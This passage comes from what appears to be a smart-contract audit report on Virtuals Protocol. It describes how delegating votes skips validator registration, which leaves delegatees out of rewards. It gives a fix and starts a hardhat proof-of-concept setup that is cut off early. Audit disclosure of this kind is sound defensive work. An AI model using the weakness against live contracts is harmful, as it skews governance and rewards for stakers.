\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);        \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Validators are added to the registry every time a stake happens.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis registry is used inside the \u003ccode\u003eAgentRewardV2\u003c/code\u003e and \u003ccode\u003eAgentRewardV3\u003c/code\u003e contract via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L223\"\u003e\u003ccode\u003e_distributeValidatorRewards\u003c/code\u003e\u003c/a\u003e and \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L308\"\u003e\u003ccode\u003eclaimAllValidatorRewards\u003c/code\u003e\u003c/a\u003e respectively. However, there’s a loophole which allows stakers (which includes the founder) to delegate their votes to someone else who is not even a validator. This can be done via the \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e, the \u003ccode\u003eVotesUpgradeable\u003c/code\u003e is deeply nested, the way to reach this file is shown below:\u003c/p\u003e\n\u003cp\u003e(consider \u003ccode\u003e-\u003e\u003c/code\u003e as \u003ccode\u003einherits\u003c/code\u003e keyword)\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"82\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgentVeToken -\u0026gt; ERC20Votes -\u0026gt; ERC20VotesUpgradeable -\u0026gt; VotesUpgradeable \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e     * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@dev\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e Delegates votes from the sender to \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`delegatee`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e     */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs we can observe, this functionality by-passes the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133\"\u003e\u003ccode\u003eAgentNftV2::addValidator\u003c/code\u003e\u003c/a\u003e call; hence, allowing a non-validator to be involved in the governance process and at the same time, rewards would lost for both the staker and delegatee.\u003c/p\u003e\n\u003ch3 id=\"impact-12\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-12\" aria-label=\"impact 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAllows delegation to a non-validator (breaking core functionality).\u003c/li\u003e\n\u003cli\u003eNo validator would be added here to the registry upon \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e call.\u003c/li\u003e\n\u003cli\u003eNo party here earns any rewards via \u003ccode\u003eAgentReward\u003c/code\u003e contracts.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eChanging delegates via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L59\"\u003e\u003ccode\u003eAgentVeToken::stake\u003c/code\u003e\u003c/a\u003e is sub-optimal, so the recommended solution would be to override the \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e and modify it to add the \u003ccode\u003eaddValidator\u003c/code\u003e call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estakingTokenToVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-14\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe test case below was ran using a base mainnet fork, please add the same to the \u003ccode\u003ehardhat.config.js\u003c/code\u003e file. The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"85\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u0026quot;hardhat\u0026quot;: \u0026quot;^2.23.0\u0026quot;,\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdd the following values to the \u003ccode\u003e.env\u003c/code\u003e file (along with private keys):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"86\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Genesis DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_PROPOSAL_THRESHOLD=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Virtual DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_QUORUM_NUMERATOR=1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Other settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCHAIN_ID=84532\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### AgentToken settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_SUPPLY=1000000000 # 1B supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT=1000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_VAULT_SUPPLY=0 #\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBOT_PROTECTION=3600 # 1hr\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTAX=100 # 3%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBONDING_TAX=1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSWAP_THRESHOLD=1 # 0.00001% of total supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### VOTING_TOKEN=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTBA_REGISTRY=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Reward settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePARENT_SHARES=2000 # 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_SHARES=1000 # 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCONTRIBUTOR_SHARES=5000 # 50%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSTAKER_SHARES=9000 # 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eREWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### TAX MANAGER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMIN_SWAP_THRESHOLD=100000000000000000 # 0.1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMAX_SWAP_THRESHOLD=1000000000000000000000 # 1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003ePoC.js\u003c/code\u003e and add the following test case inside the \u003ccode\u003e/tests\u003c/code\u003e folder and run \u003ccode\u003enpx hardhat test --grep \"Delegate a non-validator\"\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"87\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { parseEther, toBeHex, formatEther } = require(\u0026quot;ethers/utils\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  loadFixture,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  mine,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  